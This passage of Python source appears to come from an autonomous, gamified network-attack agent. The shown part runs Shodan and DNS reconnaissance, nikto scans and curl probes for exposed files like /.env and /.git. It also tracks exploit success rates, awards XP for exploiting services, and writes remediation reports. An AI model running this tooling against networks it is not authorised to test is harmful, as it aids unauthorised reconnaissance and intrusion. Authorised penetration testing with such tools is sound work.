                if "domain name pointer" in stdout.lower():
                    for line in stdout.split("\n"):
                        if "domain name pointer" in line.lower():
                            hostname = line.split("pointer")[1].strip().rstrip(".")
                            if not dev.hostname:
                                dev.hostname = hostname
                            self.log_knowledge("osint", f"dns_{ip}", {
                                "ip": ip, "hostname": hostname,
                            }, source="osint")
                            self._think(f"DNS: {ip} → {hostname}")

        # Check for public-facing services
        stdout = await self._fast_nmap("curl -s https://api.ipify.org 2>/dev/null", timeout=10)
        public_ip = stdout.strip()
        if public_ip and public_ip.count(".") == 3:
            self._think(f"Public IP: {public_ip}")
            self.log_knowledge("osint", "public_ip", {
                "ip": public_ip,
            }, source="osint")

            # Shodan lookup via web API (no key needed for basic)
            shodan = await self._fast_nmap(
                f"curl -s 'https://internetdb.shodan.io/{public_ip}' 2>/dev/null", timeout=10
            )
            if shodan.strip():
                try:
                    shodan_data = json.loads(shodan)
                    ports = shodan_data.get("ports", [])
                    hostnames = shodan_data.get("hostnames", [])
                    vulns = shodan_data.get("vulns", [])
                    if ports or vulns:
                        self._think(f"Shodan: {len(ports)} ports, {len(vulns)} vulns on {public_ip}")
                        self.log_knowledge("osint", f"shodan_{public_ip}", {
                            "ip": public_ip, "ports": ports, "hostnames": hostnames,
                            "vulns": vulns, "cpes": shodan_data.get("cpes", []),
                        }, source="osint")
                        if vulns:
                            self.create_notification(
                                NotificationType.ALERT,
                                f"Shodan vulns on public IP: {public_ip}",
                                f"Vulnerabilities: {', '.join(vulns[:10])}",
                                severity="critical",
                            )
                except json.JSONDecodeError:
                    pass

    # ── 8. Web Application Testing ───────────────────────────────

    async def _test_web_apps(self):
        """Run web application tests: nikto, directory brute on HTTP services."""
        self._think("Phase 6b: Web application testing...")

        web_targets = []
        for ip, dev in self._devices.items():
            for svc in dev.services:
                if svc.name.lower() in ("http", "https"):
                    proto = "https" if svc.name.lower() == "https" else "http"
                    web_targets.append({"ip": ip, "port": svc.port, "proto": proto})

        for target in web_targets[:4]:
            if self._paused:
                break
            ip = target["ip"]
            port = target["port"]
            proto = target["proto"]
            url = f"{proto}://{ip}:{port}"

            self._think(f"Nikto scan on {url}...")
            nikto_out = await self._fast_nmap(
                f"nikto -h {url} -maxtime 30s -nointeractive 2>/dev/null | tail -30", timeout=45
            )
            if nikto_out.strip() and "No web server" not in nikto_out:
                findings = []
                for line in nikto_out.split("\n"):
                    if "+" in line and ":" in line:
                        findings.append(line.strip())
                if findings:
                    nikto_key = f"nikto_{ip}_{port}"
                    if not self._is_known_finding("web_vuln", nikto_key):
                        self._think(f"Nikto found {len(findings)} item(s) on {url}")
                        self.log_knowledge("web_vuln", nikto_key, {
                            "target": url, "findings": findings[:20],
                        }, source="nikto")
                        self.award_xp("service_exploited", detail=f"Nikto {url}")

            # Check common web vulns manually
            for path, name in [
                ("/.env", "env_file"), ("/server-status", "server_status"),
                ("/wp-admin/", "wordpress_admin"), ("/administrator/", "joomla_admin"),
                ("/.git/HEAD", "git_exposure"), ("/.svn/entries", "svn_exposure"),
                ("/backup.zip", "backup_exposure"), ("/phpinfo.php", "phpinfo"),
            ]:
                check = await self._fast_nmap(
                    f"curl -s --connect-timeout 3 -o /dev/null -w '%{{http_code}}' {url}{path} 2>/dev/null",
                    timeout=8,
                )
                code = check.strip().replace("'", "")
                if code in ("200", "301", "302"):
                    web_key = f"{name}_{ip}_{port}"
                    if not self._is_known_finding("web_vuln", web_key):
                        self._think(f"Web vuln on {url}: {name} accessible (HTTP {code})")
                        self.award_xp("vuln_validated", detail=f"{url}{path}")
                        self.log_knowledge("web_vuln", web_key, {
                            "target": url, "path": path, "status": code, "type": name,
                        }, source="web_test")

    # ── 9. Learning Loop ─────────────────────────────────────────

    def _update_learning(self):
        """Track success/failure rates and update knowledge for better decisions next cycle."""
        total_exploits = self._stats.get("exploits_executed", 0)
        total_vulns = self._stats.get("vulns_found", 0)
        total_devices = self._stats.get("devices_found", 0)

        # Calculate success rates per attack type
        success_rates = {}
        for entry in self._knowledge_log:
            if entry.get("category") == "exploit":
                key = entry.get("key", "")
                success = entry.get("value", {}).get("success", None)
                attack_type = key.split("_")[0] if "_" in key else key
                if attack_type not in success_rates:
                    success_rates[attack_type] = {"success": 0, "fail": 0}
                if success is True:
                    success_rates[attack_type]["success"] += 1
                elif success is False:
                    success_rates[attack_type]["fail"] += 1

        # Log learning summary
        for atype, rates in success_rates.items():
            total = rates["success"] + rates["fail"]
            if total > 0:
                rate = rates["success"] / total
                self.log_knowledge("learning", f"success_rate_{atype}", {
                    "attack_type": atype,
                    "success_rate": round(rate, 3),
                    "total_attempts": total,
                    "successes": rates["success"],
                    "failures": rates["fail"],
                }, source="learning_loop")

        # Record mistake patterns
        if self._stats.get("exploits_failed", 0) > 3:
            self.record_mistake("too_many_failed_exploits", "fewer", "many")

        # Update stats for gamification
        self._stats["knowledge_entries"] = len(self._knowledge_log)
        self._stats["learning_cycles"] = self._stats.get("learning_cycles", 0) + 1

        self._think(f"Learning updated: {len(success_rates)} attack types tracked")

    # ── 10. Enhanced Reporting ───────────────────────────────────

    async def _generate_enhanced_report(self):
        """Generate report with remediation, risk scores, attack paths, executive summary."""
        try:
            devices = self.get_devices()
            vulns = []
            for n in self._notifications:
                if n.type == NotificationType.VULN_FOUND:
                    vulns.append({
                        "target": n.target, "title": n.title,
                        "message": n.message, "severity": n.severity,
                    })

            # Risk scoring
            severity_scores = {"critical": 10, "high": 7, "medium": 4, "low": 2, "info": 1}
            total_risk = sum(severity_scores.get(v["severity"], 1) for v in vulns)
            risk_level = "critical" if total_risk > 50 else "high" if total_risk > 30 else "medium" if total_risk > 15 else "low"

            # Remediation recommendations
            remediation = []
            seen_vulns = set()
            for v in vulns:
                vtype = v["title"].split(":")[0].strip()
                if vtype in seen_vulns:
                    continue
                seen_vulns.add(vtype)
                if "default credential" in v["title"].lower():
                    remediation.append({"vuln": vtype, "fix": "Change all default passwords immediately", "priority": "critical"})
                elif "ftp" in v["title"].lower() and "anonymous" in v["title"].lower():
                    remediation.append({"vuln": vtype, "fix": "Disable FTP anonymous access", "priority": "high"})
                elif "redis" in v["title"].lower():
                    remediation.append({"vuln": vtype, "fix": "Enable Redis authentication (requirepass) and bind to localhost", "priority": "critical"})
                elif "telnet" in v["title"].lower():
                    remediation.append({"vuln": vtype, "fix": "Replace Telnet with SSH", "priority": "high"})
                elif "smb" in v["title"].lower():
                    remediation.append({"vuln": vtype, "fix": "Disable SMBv1, require authentication for shares", "priority": "high"})
                elif "database" in v["title"].lower():
                    remediation.append({"vuln": vtype, "fix": "Restrict database access to localhost or trusted IPs only", "priority": "critical"})
                elif "wifi" in v["title"].lower() and "open" in v["title"].lower():
                    remediation.append({"vuln": vtype, "fix": "Enable WPA3 or WPA2-Enterprise encryption", "priority": "high"})
                elif "web" in v["title"].lower():
                    remediation.append({"vuln": vtype, "fix": "Review web application configuration and apply patches", "priority": "medium"})
                elif "shodan" in v["title"].lower():
                    remediation.append({"vuln": vtype, "fix": "Restrict public-facing services, use VPN for remote access", "priority": "critical"})

            # Attack path analysis
            attack_paths = []
            for ip, dev in self._devices.items():
                for s in dev.services:
                    if s.name.lower() in ("ssh", "ftp", "mysql", "redis", "telnet") and \
                       any("default credential" in n.title.lower() for n in self._notifications if n.target == ip):
                        attack_paths.append({
                            "entry_point": f"{ip}:{s.port} ({s.name})",
                            "impact": "Full system access via default credentials",
                            "risk": "critical",
                        })

            # Executive summary
            exec_summary = (
                f"Scan completed: {len(devices)} devices discovered, {len(vulns)} vulnerabilities found. "
                f"Overall risk: {risk_level.upper()} (score: {total_risk}). "
                f"{len(remediation)} remediation actions recommended. "
                f"{len(attack_paths)} critical attack paths identified."
            )

            report = {
                "timestamp": time.time(),
                "executive_summary": exec_summary,
                "risk_assessment": {
                    "overall_risk": risk_level,
                    "risk_score": total_risk,
                    "vuln_counts": {
                        "critical": len([v for v in vulns if v["severity"] == "critical"]),
                        "high": len([v for v in vulns if v["severity"] == "high"]),
                        "medium": len([v for v in vulns if v["severity"] == "medium"]),
                        "low": len([v for v in vulns if v["severity"] == "low"]),
                    },
                },
                "remediation": remediation,
                "attack_paths": attack_paths,
                "devices": [
                    {
                        "ip": d.get("ip"), "hostname": d.get("hostname"),
                        "type": d.get("type"), "os": d.get("os_guess"),
                        "services": d.get("services", []),
                        "risk_level": "high" if any(
                            "default credential" in n.title.lower() for n in self._notifications if n.target == d.get("ip")
                        ) else "info",
                    } for d in devices
                ],
                "wifi_networks": [
                    {"ssid": a.get("ssid"), "bssid": a.get("bssid"),
                     "encryption": a.get("encryption"), "signal": a.get("signal")}
                    for a in self.get_wifi_aps()
                ],
                "vulnerabilities": vulns,
                "topology": self.get_topology(),
                "summary": {
                    "total_devices": len(devices),
                    "total_vulns": len(vulns),
                    "total_wifi_aps": len(self.get_wifi_aps()),
                    "handshakes_captured": self._stats.get("handshakes_captured", 0),
                    "exploits_executed": self._stats.get("exploits_executed", 0),
                    "cycle_count": self._stats.get("cycle_count", 0),
                    "level": self._level,
                    "xp": self._xp,
                },
            }

            report_file = self._data_dir / f"report_{int(time.time())}.json"
            with open(report_file, 'w') as f:
                json.dump(report, f, indent=2, default=str)
            self._think(f"Enhanced report saved: {report_file.name}")

            self._reports.append(report)
            if len(self._reports) > 20:
                self._reports = self._reports[-20:]

        except Exception as e:
            logger.error(f"Enhanced report generation failed: {e}")

    # ── Data Access ───────────────────────────────────────────────

    def get_notifications(
        self,
        status: Optional[AuthStatus] = None,
        limit: int = 50,
    ) -> List[Dict[str, Any]]:
        """Get notifications, optionally filtered by auth status."""
        notifs = self._notifications
        if status:
            notifs = [n for n in notifs if n.auth_status == status]
        return [n.to_dict() for n in notifs[-limit:]]

    def get_exploit_queue(self) -> List[Dict[str, Any]]:
        """Get prioritized exploit queue."""
        return [t.to_dict() for t in self.prioritize_exploits()]

    def get_crack_sessions(self) -> List[Dict[str, Any]]:
        """Get all cracking sessions."""
        return [c.to_dict() for c in self._crack_sessions]

    def clear_old_notifications(self, max_age_hours: int = 24):
        """Clear notifications older than max_age hours."""
        cutoff = time.time() - (max_age_hours * 3600)
        self._notifications = [
            n for n in self._notifications
            if n.created_at > cutoff
        ]

    # ── Event Log & Gamification Data ────────────────────────

    def get_event_log(self, limit: int = 100, event_type: Optional[str] = None) -> List[Dict]:
        """Get recent events (XP gains, achievements, penalties, level ups)."""
        log = self._event_log
        if event_type:
            log = [e for e in log if e.get("type") == event_type]
        return log[-limit:]

    def get_mistakes(self, limit: int = 50) -> List[Dict]:
        """Get recent mistakes for learning review."""
        return self._mistakes[-limit:]

    def get_gamification(self) -> Dict[str, Any]:
        """Get full gamification status."""
        return {
            "xp": self._xp,
            "level": self._level,
            "level_name": self._get_level_name(),
            "total_xp": self._total_xp,
            "xp_to_next": self._xp_to_next_level(),
            "xp_progress": round(self._xp_progress(), 3),
            "next_level_name": self.LEVEL_NAMES[min(self._level, len(self.LEVEL_NAMES)-1)],
            "achievements": [
                {**self.ACHIEVEMENTS[k], "key": k}
                for k in self._achievements
            ],
            "achievements_available": len(self.ACHIEVEMENTS),
            "streaks": self._streaks,
            "mistakes": self.get_learning_data(),
            "recent_events": self.get_event_log(20),
            "stats": self._stats,
        }

    # ── Network Data Access (tamagotchi is the sole engine) ─────

    def get_devices(self) -> List[Dict[str, Any]]:
        return [d.to_dict() if hasattr(d, 'to_dict') else d for d in self._devices.values()]

    def get_device(self, ip: str) -> Optional[Dict[str, Any]]:
        dev = self._devices.get(ip)
        if dev and hasattr(dev, 'to_dict'):
            return dev.to_dict()
        return dev

    def get_networks(self) -> List[Dict[str, Any]]:
        return [n.to_dict() if hasattr(n, 'to_dict') else n for n in self._networks.values()]

    def get_wifi_aps(self) -> List[Dict[str, Any]]:
        return [a.to_dict() if hasattr(a, 'to_dict') else a for a in self._wifi_aps.values()]

    def get_topology(self) -> Dict[str, Any]:
        return self._topology

    def get_scan_history(self) -> List[Dict[str, Any]]:
        return self._scan_history

    def get_live_events(self, since: float = 0) -> List[Dict[str, Any]]:
        if since == 0:
            return self._live_events[-50:]
        return [e for e in self._live_events if e.get("timestamp", 0) > since]

    def get_thinking_log(self, limit: int = 200) -> List[Dict[str, Any]]:
        return list(reversed(self._thinking_log[-limit:]))

    def search_devices(self, query: str) -> List[Dict[str, Any]]:
        q = query.lower()
        results = []
        for dev in self._devices.values():
            d = dev.to_dict() if hasattr(dev, 'to_dict') else dev
            searchable = f"{d.get('ip','')} {d.get('hostname','')} {d.get('os_guess','')} " + \
                " ".join(f"{s.get('name','')} {s.get('version','')}" for s in d.get('services', []))
            if q in searchable.lower():
                results.append(d)
        return results

    def _emit_event(self, event_type: str, data: Dict[str, Any]):
        import time as _time
        event = {"type": event_type, "timestamp": _time.time(), "data": data}
        self._live_events.append(event)
        if len(self._live_events) > self._max_live_events:
            self._live_events = self._live_events[-self._max_live_events:]

    def _broadcast_tama_event(self, event_type: str, data: Dict[str, Any]):
        """Push event to all connected tamagotchi WebSocket clients."""
        import json as _json
        msg = _json.dumps({"type": event_type, "data": data, "timestamp": time.time()})
        dead = set()
        for ws in self._ws_clients:
            try:
                import asyncio as _aio
                loop = _aio.get_event_loop()
                if loop.is_running():
                    _aio.ensure_future(ws.send_text(msg))
                else:
                    loop.run_until_complete(ws.send_text(msg))
            except Exception:
                dead.add(ws)
        self._ws_clients -= dead

    def _build_topology(self):
        """Build topology graph from collected device/network/wifi data."""
        from agents.sentient import DeviceType
        nodes = []
        edges = []
        node_ids = set()

        def add_node(nid, **kw):
            if nid not in node_ids:
                nodes.append({"id": nid, **kw})
                node_ids.add(nid)

        def add_edge(src, tgt, **kw):
            edges.append({"source": src, "target": tgt, **kw})

        add_node(f"self_{self._our_ip}", type="self", label="ELIOT",
                 icon="🛡️", ip=self._our_ip, color="#3b82f6", radius=22)

        gw = ""
        try:
            import subprocess
            r = subprocess.run(["ip", "route", "show", "default"], capture_output=True, text=True, timeout=5)
            for line in r.stdout.splitlines():
                if "via" in line:
                    gw = line.split("via")[1].split()[0]
                    break
        except Exception:
            pass

        if gw:
            add_node(f"router_{gw}", type="router", label="Gateway", icon="📡",
                     ip=gw, color="#f59e0b", radius=18)
            add_edge(f"self_{self._our_ip}", f"router_{gw}", type="route")

        icon_map = {
            "router": "📡", "server": "🖥️", "workstation": "💻",
            "mobile": "📱", "iot": "🏠", "printer": "🖨️", "nas": "💾", "unknown": "❓",
        }
        for ip, dev in self._devices.items():
            d = dev.to_dict() if hasattr(dev, 'to_dict') else dev
            dtype = d.get("device_type", "unknown")
            if isinstance(dtype, DeviceType):
                dtype = dtype.value
            nid = f"dev_{ip}"
            add_node(nid, type=dtype, label=d.get("hostname") or ip,
                     icon=icon_map.get(dtype, "❓"), ip=ip,
                     color="#60a5fa", radius=12)
            if gw and ip.startswith(".".join(gw.split(".")[:3])):
                add_edge(nid, f"router_{gw}", type="lan")

        for bssid, ap in self._wifi_aps.items():
            a = ap.to_dict() if hasattr(ap, 'to_dict') else ap
            nid = f"ap_{bssid}"
            add_node(nid, type="wifi_ap", label=a.get("ssid", "?"),
                     icon="📶", ip="", bssid=bssid,
                     signal=a.get("signal", 0), color="#10b981", radius=14)
            add_edge(f"self_{self._our_ip}", nid, type="wifi",
                     label=f"{a.get('signal', 0)}dBm")

        self._topology = {"nodes": nodes, "edges": edges}

    async def ingest_scan_result(self, command: str, stdout: str, source: str = "manual"):
        """Ingest external scan results (from shell agent, manual commands, etc.)."""
        self.log_knowledge("scan_result", f"{source}_{int(time.time())}", {
            "command": command,
            "output_preview": stdout[:2000],
            "source": source,
        }, source=source)

        cmd_lower = command.lower()
        if "nmap" in cmd_lower:
            self._parse_nmap_to_devices(stdout, command)
        if "--script vuln" in cmd_lower or "nikto" in cmd_lower:
            self._parse_vuln_output(stdout, command)

        self.award_xp("scan_informed", detail=f"External: {command[:60]}")

    def _parse_nmap_to_devices(self, stdout: str, command: str = ""):
        from agents.sentient import Device, Service, DeviceType
        import re as _re
        current_ip = ""
        for line in stdout.splitlines():
            m = _re.search(r"Nmap scan report for (\S+?)(?:\s+\((\d+\.\d+\.\d+\.\d+)\))?", line)
            if m:
                hostname = m.group(1)
                ip = m.group(2) or hostname
                if not _re.match(r'\d+\.\d+\.\d+\.\d+', ip):
                    ip = hostname
                current_ip = ip
                if ip not in self._devices:
                    self._devices[ip] = Device(ip=ip, hostname=hostname)
                continue
            if current_ip and ("/tcp" in line or "/udp" in line) and "open" in line:
                parts = line.split()
                if len(parts) >= 3:
                    port_proto = parts[0].split("/")
                    port = int(port_proto[0])
                    proto = port_proto[1] if len(port_proto) > 1 else "tcp"
                    name = parts[2]
                    version = " ".join(parts[3:]) if len(parts) > 3 else ""
                    svc = Service(port=port, protocol=proto, name=name, version=version)
                    dev = self._devices[current_ip]
                    existing_ports = {s.port for s in dev.services}
                    if port not in existing_ports:
                        dev.services.append(svc)

    def _parse_vuln_output(self, stdout: str, command: str = ""):
        for line in stdout.splitlines():
            if any(kw in line.lower() for kw in ["vuln", "vulnerability", "cve-", "critical", "high"]):
                self.log_knowledge("vuln_finding", f"ext_{int(time.time())}", {
                    "line": line.strip(),
                    "source": command,
                }, source="external_scan")


# ── Singleton ────────────────────────────────────────────────

_tamagotchi_engine: Optional[TamagotchiEngine] = None


def get_tamagotchi_engine() -> TamagotchiEngine:
    global _tamagotchi_engine
    if _tamagotchi_engine is None:
        _tamagotchi_engine = TamagotchiEngine()
    return _tamagotchi_engine
